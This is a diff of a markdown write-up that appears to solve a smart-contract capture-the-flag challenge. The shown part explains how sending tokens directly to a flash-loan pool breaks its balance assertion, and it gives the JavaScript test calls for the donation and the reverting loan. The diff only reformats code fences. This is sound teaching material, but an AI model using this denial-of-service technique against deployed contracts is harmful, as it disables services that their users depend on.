@@ -32,15 +32,16 @@ Therefore, if tokens are deposited to the contract address via the `transfer` me
 The balance of the contract having increased anyway, the value `balanceBefore` will become different from `poolBalance` and the test `assert(poolBalance == balanceBefore)` will not pass.
 
 ## How to exploit?
+
 - Initial token balance of the pool is 1000000.
 - Initial token balance of the attacker is 100.
 - Tokens are transferred from the attacker to the pool via:
-	```solidity
+	```javascript
 	await  this.token.transfer(this.pool.address, INITIAL_ATTACKER_BALANCE, {
 	from:  attacker,
 	});
 	```
 - The call to `flashLoan` now reverts
-	```solidity
+	```javascript
 	await this.receiverContract.executeFlashLoan(10, { from:  someUser })
 	```
